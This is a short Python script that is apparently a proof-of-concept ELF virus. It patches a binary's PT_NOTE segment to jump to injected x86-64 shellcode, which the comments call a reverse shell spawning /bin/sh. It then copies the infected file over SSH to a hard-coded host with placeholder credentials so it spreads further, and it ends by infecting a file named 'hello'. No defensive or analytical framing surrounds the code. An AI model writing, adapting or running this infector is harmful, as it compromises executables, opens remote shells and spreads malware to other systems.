import struct
import paramiko

# PT_NOTE jump to PT_LOAD 
def modify_ptnote_jump(fd, note_offset, load_vaddr):
    fd.seek(note_offset)
    #  PT_LOAD offset
    jump_offset = load_vaddr - (note_offset + 5)
    jmp_instr = b'\xE9' + struct.pack('<I', jump_offset & 0xFFFFFFFF)  # JMP 
    fd.write(jmp_instr)

# inject shellcode to PT_LOAD 
def inject_shellcode(fd, load_offset, shellcode):
    fd.seek(load_offset)
    fd.write(b'infected')  # 
    fd.write(shellcode)    # inject Shell by shellcode

def propagate_to_remote(host, port, user, password, infected_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=port, username=user, password=password)
        sftp = ssh.open_sftp()
        sftp.put(infected_file, f"/tmp/{infected_file}")
        sftp.close()
        print(f"Successfully propagated {infected_file} to {host}")
    except Exception as e:
        print(f"Failed to propagate to {host}: {e}")
    finally:
        ssh.close()

def infect_elf(file_path):
    with open(file_path, 'rb+') as fd:
        # 使用 PT_NOTE 和 PT_LOAD 的已知偏移和地址
        note_offset = 0x358  # PT_NOTE 段的文件偏移
        load_offset = 0x1175  # PT_LOAD 段的文件偏移
        load_vaddr = 0x1175  # PT_LOAD 段的虚拟地址

        # 反向 Shell shellcode
        shellcode = (
            b"\x48\x31\xc0\x50\x50\x50\xb0\x29\x48\x31\xff\xbf\x02\x00\x01\xbb"
            b"\x48\x89\xe7\x48\x31\xf6\x0f\x05\x48\x97\x48\x31\xc0\x50\x66\x68"
            b"\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\x0f\x05\x48\x31\xc0\xb0\x21"
            b"\x48\x31\xff\x48\xff\xc7\x0f\x05\x48\x83\xf9\x02\x75\xf3\x48\x31"
            b"\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
            b"\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
        )

        # inject shellcode
        inject_shellcode(fd, load_offset, shellcode)

        #  PT_NOTE to PT_LOAD
        modify_ptnote_jump(fd, note_offset, load_vaddr)

        # Diffusion de fichiers infectés vers d'autres hôtes
        propagate_to_remote('192.168.1.105', 22, 'user', 'password', file_path)

# 开始感染
infect_elf('hello')

